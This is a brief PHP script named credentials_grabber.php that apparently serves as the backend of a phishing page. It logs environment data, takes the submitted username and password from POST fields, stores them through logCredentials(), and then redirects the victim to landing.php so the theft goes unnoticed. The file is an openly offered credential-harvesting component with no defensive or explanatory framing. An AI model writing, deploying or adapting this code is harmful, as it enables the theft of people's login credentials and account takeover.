<?php
/**
 * credentials_grabber.php
 * Logs credentials, then redirects.
 */

require_once __DIR__ . '/logger.php';

// Log environment data
logEnvironment();

if (isset($_POST['uname']) && isset($_POST['psw'])) {
    $uname = trim($_POST['uname']);
    $psw   = trim($_POST['psw']);

    logCredentials($uname, $psw);
}

header('Location: landing.php');
exit;
